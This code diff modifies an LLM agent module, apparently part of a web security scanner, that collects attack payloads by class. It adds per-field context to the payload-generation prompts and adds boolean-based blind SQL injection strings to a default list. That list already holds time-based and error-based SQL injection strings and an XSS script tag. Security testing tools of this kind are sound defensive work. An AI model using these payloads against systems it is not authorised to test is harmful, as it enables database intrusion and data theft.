@@ -30,6 +30,7 @@ async def run_librarian(
     runner: Optional[AnthropicRunner] = None,
     timeout: int = 120,
     use_mcp: bool = False,
+    field_context: Optional[dict[str, dict[str, str]]] = None,
 ) -> dict[str, Any]:
     """Run the Librarian agent.
 
@@ -39,6 +40,7 @@ async def run_librarian(
         runner: AnthropicRunner instance. If None, uses offline KB only.
         timeout: Timeout in seconds.
         use_mcp: If True, use Brave Search MCP when local KB is insufficient.
+        field_context: Dict mapping field_name -> {sample_value, description} for context-specific payloads.
 
     Returns:
         Dict mapping attack_class -> list of payload dicts.
@@ -50,7 +52,7 @@ async def run_librarian(
     if use_mcp and not payloads:
         try:
             enriched = await _search_mcp_online(
-                runner, attack_classes, tech_stack, timeout
+                runner, attack_classes, tech_stack, timeout, field_context
             )
             if enriched:
                 payloads = enriched
@@ -63,7 +65,7 @@ async def run_librarian(
     # If we have results and an LLM runner, enrich with live insights
     if runner and payloads:
         try:
-            enriched = _enrich_with_llm(runner, attack_classes, payloads, tech_stack, timeout)
+            enriched = _enrich_with_llm(runner, attack_classes, payloads, tech_stack, timeout, field_context)
             if enriched:
                 return enriched
         except Exception:
@@ -120,6 +122,7 @@ async def _search_mcp_online(
     attack_classes: list[str],
     tech_stack: Optional[dict[str, Any]],
     timeout: int,
+    field_context: Optional[dict[str, dict[str, str]]] = None,
 ) -> Optional[dict[str, Any]]:
     """Search using MCP web search tools (Brave Search).
 
@@ -135,10 +138,12 @@ async def _search_mcp_online(
         "attack_classes": attack_classes,
         "tech_stack": tech_stack or {},
         "use_mcp": True,
+        "field_context": field_context or {},
         "constraint": (
             "Output ONLY valid JSON. No markdown fences. No commentary. "
             "Use the MCP web_search tool to find payloads when local KB is insufficient. "
-            "Include a 'source' field in each payload dict with the URL where the payload was found."
+            "Include a 'source' field in each payload dict with the URL where the payload was found. "
+            "Context-specific payloads must respect field constraints (e.g., country name should exclude digits/symbols, phone should be digits-only)."
         ),
     }
 
@@ -236,6 +241,7 @@ def _enrich_with_llm(
     existing_payloads: dict[str, Any],
     tech_stack: Optional[dict[str, Any]],
     timeout: int,
+    field_context: Optional[dict[str, dict[str, str]]] = None,
 ) -> Optional[dict[str, Any]]:
     """Enrich local KB results with LLM-sourced payloads.
 
@@ -245,9 +251,11 @@ def _enrich_with_llm(
         "attack_classes": attack_classes,
         "existing_payloads": existing_payloads,
         "tech_stack": tech_stack or {},
+        "field_context": field_context or {},
         "constraint": (
             "Output ONLY valid JSON. No markdown fences. No commentary. "
-            "Include a 'source' field in each payload dict with the URL where the payload was found."
+            "Include a 'source' field in each payload dict with the URL where the payload was found. "
+            "Context-specific payloads must respect field constraints (e.g., country name should exclude digits/symbols, phone should be digits-only)."
         ),
     }
 
@@ -278,6 +286,11 @@ def get_default_payloads() -> dict[str, Any]:
             {"value": "'; WAITFOR DELAY '0:0:5'--", "encoding": "none", "technique": "time-based blind"},
             {"value": "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
              "encoding": "none", "technique": "error-based"},
+            # Paired boolean-based blind SQLi controls
+            {"value": "1 AND 1=1", "encoding": "none", "technique": "boolean-based blind (true)"},
+            {"value": "1 AND 1=2", "encoding": "none", "technique": "boolean-based blind (false)"},
+            {"value": "' AND 'a'='a", "encoding": "none", "technique": "boolean-based blind string (true)"},
+            {"value": "' AND 'a'='b", "encoding": "none", "technique": "boolean-based blind string (false)"},
         ],
         "xss": [
             {"value": "<script>alert(1)</script>", "encoding": "none", "technique": "reflected XSS"},
